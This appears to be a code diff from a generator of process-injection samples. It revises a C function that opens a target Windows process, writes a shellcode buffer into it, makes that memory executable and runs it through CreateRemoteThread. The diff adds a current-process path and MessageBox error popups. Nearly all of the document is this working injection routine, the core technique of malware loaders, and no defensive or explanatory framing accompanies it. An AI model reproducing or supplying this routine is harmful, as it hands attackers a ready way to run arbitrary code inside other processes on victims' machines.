@@ -37,48 +37,58 @@ def generate_classic_injection() -> Dict[str, Any]:
 static BOOL classic_inject(DWORD pid,
                             unsigned char *shellcode,
                             size_t shellcode_len) {
-    HANDLE hProcess = OpenProcess(
-        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
-        FALSE, pid);
+    HANDLE hProcess = NULL;
+    if (pid == GetCurrentProcessId()) {
+        hProcess = GetCurrentProcess();
+    } else {
+        hProcess = OpenProcess(
+            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
+            FALSE, pid);
+    }
     if (!hProcess) return FALSE;
 
     // Allocate RW memory in the target process
-    LPVOID remote_addr = VirtualAllocEx(hProcess, NULL, shellcode_len,
-                                        MEM_COMMIT | MEM_RESERVE,
-                                        PAGE_READWRITE);
-    if (!remote_addr) {
+    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, shellcode_len,
+                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemoteBuf) {
+        MessageBoxA(NULL, "VirtualAllocEx Failed", "ERROR", MB_OK | MB_ICONERROR);
         CloseHandle(hProcess);
         return FALSE;
     }
 
-    // Write shellcode
-    SIZE_T written = 0;
-    if (!WriteProcessMemory(hProcess, remote_addr, shellcode,
-                             shellcode_len, &written) ||
-        written != shellcode_len) {
-        VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
+    // Write the shellcode to the allocated memory
+    if (!WriteProcessMemory(hProcess, pRemoteBuf, shellcode, shellcode_len, NULL)) {
+        MessageBoxA(NULL, "WriteProcessMemory Failed", "ERROR", MB_OK | MB_ICONERROR);
+        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return FALSE;
     }
 
-    // Change to RX (Write ^ Execute)
+    // Change protection to RX
     DWORD old_protect = 0;
-    VirtualProtectEx(hProcess, remote_addr, shellcode_len,
-                     PAGE_EXECUTE_READ, &old_protect);
-
-    // Create remote thread pointing at shellcode
-    HANDLE hThread = CreateRemoteThread(
-        hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)remote_addr, NULL, 0, NULL);
-    if (!hThread) {
-        VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
+    if (!VirtualProtectEx(hProcess, pRemoteBuf, shellcode_len,
+                        PAGE_EXECUTE_READ, &old_protect)) {
+        MessageBoxA(NULL, "VirtualProtectEx Failed", "ERROR", MB_OK | MB_ICONERROR);
+        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return FALSE;
     }
 
+    // Create a remote thread to execute the shellcode
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                                        (LPTHREAD_START_ROUTINE)pRemoteBuf,
+                                        NULL, 0, NULL);
+    if (!hThread) {
+        MessageBoxA(NULL, "CreateRemoteThread Failed", "ERROR", MB_OK | MB_ICONERROR);
+        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    MessageBoxA(NULL, "Thread Created Successfully!", "DEBUG", MB_OK);
     WaitForSingleObject(hThread, INFINITE);
     CloseHandle(hThread);
-    CloseHandle(hProcess);
+    if (pid != GetCurrentProcessId()) CloseHandle(hProcess); // Only close if not current process
     return TRUE;
 }
 
